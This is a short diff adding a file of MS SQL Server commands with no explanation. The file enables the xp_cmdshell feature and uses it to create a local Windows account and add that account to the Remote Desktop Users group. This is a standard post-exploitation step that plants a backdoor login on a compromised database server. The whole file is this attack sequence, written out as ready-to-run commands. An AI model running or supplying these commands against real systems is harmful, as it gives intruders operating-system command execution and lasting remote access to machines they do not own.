@@ -1,0 +1,7 @@
+sp_configure 'show advanced option',1
+reconfigure
+sp_configure 'xp_cmdshell',1
+reconfigure
+
+xp_cmdshell 'net user username password /add'
+xp_cmdshell 'net localgroup "Remote Desktop Users" username /add'
